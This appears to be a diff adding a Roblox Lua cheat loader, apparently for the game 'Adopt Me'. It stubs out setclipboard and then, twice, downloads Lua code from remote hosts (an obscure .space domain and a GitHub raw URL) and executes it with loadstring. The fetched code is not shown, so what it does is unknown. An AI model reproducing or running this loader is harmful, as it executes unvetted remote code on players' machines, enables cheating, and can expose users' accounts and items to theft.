@@ -1,0 +1,7 @@
+setclipboard = function() end
+
+getgenv().gui = false
+loadstring(game:HttpGet("https://egorikusa.space/25bc3a35089cf3de005310fa.lua", true))()
+
+getgenv().gui = true
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraScript/Script/main/AdoptMeWINTER"))()
